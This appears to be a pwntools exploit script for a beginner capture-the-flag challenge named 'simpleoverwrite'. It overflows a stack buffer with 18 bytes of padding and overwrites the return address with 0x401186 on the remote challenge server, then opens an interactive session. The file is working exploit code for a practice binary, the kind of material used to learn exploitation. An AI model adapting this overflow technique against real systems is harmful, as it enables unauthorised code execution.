from pwn import *

elf = ELF('./chall')
#io = process(elf.path)
io = remote('simpleoverwrite.beginners.seccon.games', 9001)
context.binary = elf

payload = b'a' * 18
payload += p64(0x401186)

io.sendlineafter(b'input:', payload)

io.interactive()
